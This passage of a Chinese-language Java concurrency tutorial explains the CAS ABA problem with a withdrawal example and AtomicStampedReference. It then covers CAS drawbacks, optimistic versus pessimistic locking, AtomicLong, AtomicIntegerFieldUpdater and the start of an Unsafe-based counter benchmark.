    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新成功（%d-&gt;%d）.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token class-name">Thread</span> t2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    money<span class="token punctuation">.</span><span class="token function">getAndAdd</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新成功（%d-&gt;%d）.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  t2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token class-name">Thread</span> t3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    money<span class="token punctuation">.</span><span class="token function">getAndAdd</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新成功（%d-&gt;%d）.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  t3<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  t1<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  t2<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  t3<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 输出50，钱数错误</span>
  <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>money<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

输出：
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span><span class="token operator">-</span>更新成功（<span class="token number">100</span><span class="token operator">-&gt;</span><span class="token number">50</span>）<span class="token punctuation">.</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span>更新成功（<span class="token number">100</span><span class="token operator">-&gt;</span><span class="token number">100</span>）<span class="token punctuation">.</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>更新成功（<span class="token number">100</span><span class="token operator">-&gt;</span><span class="token number">50</span>）<span class="token punctuation">.</span>
<span class="token number">50</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong><code>ABA</code>问题解决：AtomicStampedReference</strong></p>
<p><strong>解决方法</strong>： 在变量前面加上版本号（int），每次变量更新的时候变量的<strong>版本号都<code>+1</code></strong>，即<code>A-&gt;B-&gt;A</code>就变成了<code>1A-&gt;2B-&gt;3A</code>。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testAtomicStampedReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
    <span class="token keyword">final</span> <span class="token class-name">AtomicInteger</span> stamp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">final</span> <span class="token class-name">Integer</span> moneyTotal <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token class-name">AtomicStampedReference</span> money <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicStampedReference</span><span class="token punctuation">(</span>moneyTotal<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// step1：取款50</span>
    <span class="token keyword">final</span> <span class="token class-name">Integer</span> moneyStep1 <span class="token operator">=</span> moneyTotal <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">;</span>
    <span class="token class-name">Thread</span> t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>money<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>moneyTotal<span class="token punctuation">,</span> moneyStep1<span class="token punctuation">,</span> stamp<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stamp<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新成功（%d-&gt;%d）:%d.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span>
                              money<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新失败（%d-&gt;%d）:%d.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span>
                              money<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"T1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Thread</span> t2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>

        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>money<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>moneyTotal<span class="token punctuation">,</span> moneyStep1<span class="token punctuation">,</span> stamp<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stamp<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新成功（%d-&gt;%d）:%d.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span>
                              money<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新失败（%d-&gt;%d）:%d.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span>
                              money<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"T2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    t2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// step2. 他人转入50</span>
    <span class="token keyword">final</span> <span class="token class-name">Integer</span> moneyStep2 <span class="token operator">=</span> moneyStep1 <span class="token operator">+</span> <span class="token number">50</span><span class="token punctuation">;</span>
    <span class="token class-name">Thread</span> t3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>money<span class="token punctuation">.</span><span class="token function">compareAndSet</span><span class="token punctuation">(</span>moneyStep1<span class="token punctuation">,</span> moneyStep2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新成功（%d-&gt;%d）:%d.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span>
                              money<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-更新成功（%d-&gt;%d）:%d.\n"</span><span class="token punctuation">,</span> moneyTotal<span class="token punctuation">,</span>
                              money<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"T3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    t3<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    t1<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    t2<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    t3<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-最终（%d）:%d.\n"</span><span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> money<span class="token punctuation">.</span><span class="token function">getStamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

输出
<span class="token constant">T1</span><span class="token operator">-</span>更新成功（<span class="token number">100</span><span class="token operator">-&gt;</span><span class="token number">50</span>）<span class="token operator">:</span><span class="token number">1.</span>
<span class="token constant">T3</span><span class="token operator">-</span>更新成功（<span class="token number">100</span><span class="token operator">-&gt;</span><span class="token number">100</span>）<span class="token operator">:</span><span class="token number">2.</span>
<span class="token constant">T2</span><span class="token operator">-</span>更新失败（<span class="token number">100</span><span class="token operator">-&gt;</span><span class="token number">100</span>）<span class="token operator">:</span><span class="token number">2.</span>
main<span class="token operator">-</span>最终（<span class="token number">100</span>）<span class="token operator">:</span><span class="token number">2.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="CAS的缺点：循环时间长开销大">CAS的缺点：循环时间长开销大</h3>
<p>如果<code>CAS</code>操作失败，就需要循环进行<code>CAS</code>操作(循环同时将期望值更新为最新的)，如果长时间都不成功的话，那么会造成CPU极大的开销。</p>
<blockquote>
<p>这种循环也称为自旋</p>
</blockquote>
<p><strong>解决方法</strong>： 限制自旋次数，防止进入死循环。</p>
<h3 id="CAS的缺点：只能保证一个共享变量的原子操作">CAS的缺点：只能保证一个共享变量的原子操作</h3>
<p><code>CAS</code>的原子操作只能针对一个共享变量。</p>
<p><strong>解决方法</strong>： 如果需要对多个共享变量进行操作，可以使用加锁方式(悲观锁)保证原子性，或者可以把多个共享变量合并成一个共享变量进行<code>CAS</code>操作。</p>
<h3 id="CAS的应用">CAS的应用</h3>
<p>我们知道<code>CAS</code>操作并不会锁住共享变量，也就是一种<strong>非阻塞</strong>的同步机制，<code>CAS</code>就是乐观锁的实现。</p>
<ol>
<li><strong>乐观锁</strong>总是假设最好的情况，每次去操作数据都认为不会被别的线程修改数据，<strong>所以在每次操作数据的时候都不会给数据加锁</strong>，即在线程对数据进行操作的时候，<strong>别的线程不会阻塞</strong>仍然可以对数据进行操作，只有在需要更新数据的时候才会去判断数据是否被别的线程修改过，如果数据被修改过则会拒绝操作并且返回错误信息给用户。</li>
<li><strong>悲观锁</strong>总是假设最坏的情况，每次去操作数据时候都认为会被的线程修改数据，<strong>所以在每次操作数据的时候都会给数据加锁</strong>，让别的线程无法操作这个数据，别的线程会一直阻塞直到获取到这个数据的锁。这样的话就会影响效率，比如当有个线程发生一个很耗时的操作的时候，别的线程只是想获取这个数据的值而已都要等待很久。</li>
</ol>
<p><code>Java</code>利用<code>CAS</code>的乐观锁、原子性的特性高效解决了多线程的安全性问题，例如JDK1.8中的集合类<code>ConcurrentHashMap</code>、关键字<code>volatile</code>、<code>ReentrantLock</code>等。</p>
<h2 id="AtomicLong">AtomicLong</h2>
<ul>
<li>
<p>区别于AtomicInteger：VM_SUPPORTS_LONG_CAS：虚拟机是否支持 CAS 操作</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * Records whether the underlying JVM supports lockless
 * compareAndSwap for longs. While the Unsafe.compareAndSwapLong
 * method works in either case, some constructions should be
 * handled at Java level to avoid locking user-visible locks.
 */</span>
<span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token constant">VM_SUPPORTS_LONG_CAS</span> <span class="token operator">=</span> <span class="token class-name">VMSupportsCS8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
<span class="token comment">/**
 * Returns whether underlying JVM supports lockless CompareAndSet
 * for longs. Called only once and cached in VM_SUPPORTS_LONG_CAS.
 */</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">native</span> <span class="token keyword">boolean</span> <span class="token class-name">VMSupportsCS8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h2 id="AtomicReference">AtomicReference</h2>
<p>reference的地址为int类型</p>
<h2 id="AtomicXXXFieldUpdater">AtomicXXXFieldUpdater</h2>
<p>使用AtomicXXXFieldUpdater的原因：</p>
<ul>
<li>
<p>想让类的操作属性具备原子性的条件</p>
<ol>
<li>类的属性是volatile（ Must be volatile type）</li>
<li>==非当前类调用，则非private、protected==</li>
<li>类型必须一致</li>
</ol>
</li>
<li>
<p>不想使用锁（包括显示锁、重量级锁Synchronized）</p>
</li>
<li>
<p>大量需要原子类型修饰的对象，比较消耗资源</p>
</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AtomicIntegerFieldUpdaterTest</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">AtomicIntegerFieldUpdater</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">TestBean</span><span class="token punctuation">&gt;</span></span> updater <span class="token operator">=</span> <span class="token class-name">AtomicIntegerFieldUpdater</span><span class="token punctuation">.</span><span class="token function">newUpdater</span><span class="token punctuation">(</span><span class="token class-name">TestBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"param"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TestBean</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        updater<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>updater<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">class</span> <span class="token class-name">TestBean</span> <span class="token punctuation">{</span>
        <span class="token comment">// 非本类调用，param 不可设置未private、protected</span>
        <span class="token keyword">volatile</span> <span class="token keyword">int</span> param<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Unsafe">Unsafe</h2>
<p>​	 java 调用C++/C 再 调用汇编</p>
<h3 id="几种Counter方案的性能对比。">几种Counter方案的性能对比。</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span><span class="token class-name">Unsafe</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicInteger</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Lock</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">ReentrantLock</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">Consumer</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UnsafeTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">THREAD_COUNT</span> <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">MAX_NUM</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">VolatileCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Volatile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">AtomicCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Executors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SynCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Sync"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LockCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Lock"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CasCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Cas"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span><span class="token punctuation">&gt;</span></span> <span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
